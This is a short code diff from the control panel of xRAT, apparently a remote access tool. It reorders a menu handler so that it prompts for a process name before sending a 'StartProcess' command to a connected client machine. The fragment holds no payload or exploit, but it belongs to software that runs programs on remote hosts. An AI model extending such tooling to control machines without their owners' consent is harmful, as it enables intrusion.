@@ -48,10 +48,10 @@ namespace xRAT_2.Forms
 
         private void ctxtStartProcess_Click(object sender, EventArgs e)
         {
-            if (cClient != null)
+            string processname = string.Empty;
+            if (InputBox.Show("Processname", "Enter Processname:", ref processname) == System.Windows.Forms.DialogResult.OK)
             {
-                string processname = string.Empty;
-                if (InputBox.Show("Processname", "Enter Processname:", ref processname) == System.Windows.Forms.DialogResult.OK)
+                if (cClient != null)
                     new Core.Packets.ServerPackets.StartProcess(processname).Execute(cClient);
             }
         }
